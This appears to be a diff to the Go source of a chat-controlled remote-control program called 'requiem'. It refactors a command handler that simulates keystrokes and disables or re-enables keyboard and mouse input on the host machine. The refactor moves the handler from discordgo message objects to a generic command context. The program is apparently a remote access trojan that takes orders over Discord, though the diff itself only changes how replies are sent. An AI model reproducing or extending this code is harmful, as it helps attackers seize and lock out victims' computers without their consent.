@@ -6,9 +6,8 @@ import (
 	"time"
 
 	"requiem/funcs"
+	"requiem/store"
 	"requiem/utils"
-
-	"github.com/bwmarrin/discordgo"
 )
 
 var specialKeys = map[string]uint16{
@@ -32,19 +31,19 @@ var specialKeys = map[string]uint16{
 	"[WINDOWS]":   0x5B,
 }
 
-func (*InputCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*InputCommand) Exec(ctx *store.CommandContext, args []string) {
 	content := strings.Join(args, " ")
 
 	if utils.HasFlag(content, "simulate") {
 		text := utils.UnwrapQuotes(content)
 		if text == "" {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to wrap the text to simulate in double quotes.", msg.Reference())
+			ctx.ReplyMsg("🟥 You need to wrap the text to simulate in double quotes.")
 			return
 		}
 
 		delay, found := utils.FindNumber(content)
 		if found == false {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a delay in millisecond.", msg.Reference())
+			ctx.ReplyMsg("🟥 You need to provide a delay in millisecond.")
 			return
 		}
 
@@ -70,7 +69,7 @@ func (*InputCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 			}
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully simulated keys.", msg.Reference())
+		ctx.ReplyMsg("🟩 Successfully simulated keys.")
 		return
 	}
 
@@ -89,14 +88,14 @@ func (*InputCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		funcs.DisableInputs(true)
 		err = funcs.DisableInputs(false)
 	} else {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
+		ctx.ReplyMsg("🟥 Invalid flag.")
 		return
 	}
 
 	if err == nil {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully set input.", msg.Reference())
+		ctx.ReplyMsg("🟩 Successfully set input.")
 	} else {
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to set input - %s", err), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to set input - %s", err))
 	}
 }
 
